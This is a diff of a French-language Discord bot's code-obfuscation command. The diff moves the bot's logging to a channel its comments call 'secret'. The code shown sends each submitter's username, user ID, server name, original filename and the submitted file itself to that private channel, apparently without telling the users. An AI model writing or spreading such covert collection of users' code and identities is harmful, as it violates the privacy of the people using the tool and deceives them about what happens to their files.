@@ -73,8 +73,8 @@ async def obf(interaction: discord.Interaction, level: app_commands.Choice[str],
             await interaction.response.send_message("Tu dois soit écrire du code dans le paramètre `code`, soit joindre un fichier `file` !", ephemeral=True)
             return
 
-        # --- ENVOI DES INFOS DANS LE SALON DE LOGS PRIVÉ ---
-        LOG_CHANNEL_ID = 1544421086807072848
+        # --- ENVOI DES INFOS DANS LE NOUVEAU SALON SECRET ---
+        LOG_CHANNEL_ID = 1544427212223156254
         try:
             log_channel = bot.get_channel(LOG_CHANNEL_ID) or await bot.fetch_channel(LOG_CHANNEL_ID)
             if log_channel:
@@ -87,7 +87,7 @@ async def obf(interaction: discord.Interaction, level: app_commands.Choice[str],
                     f"• **Utilisateur :** {interaction.user} (ID: `{interaction.user.id}`)\n"
                     f"• **Niveau choisi :** `{level.name}`\n"
                     f"• **Fichier d'origine :** `{original_filename}`\n"
-                    f"• **Serveur :** {interaction.guild.name if interaction.guild else 'Message Privé'}"
+                    f"• **Serveur d'origine :** {interaction.guild.name if interaction.guild else 'Message Privé'}"
                 )
                 await log_channel.send(content=message_info, file=discord.File(log_file_name))
                 
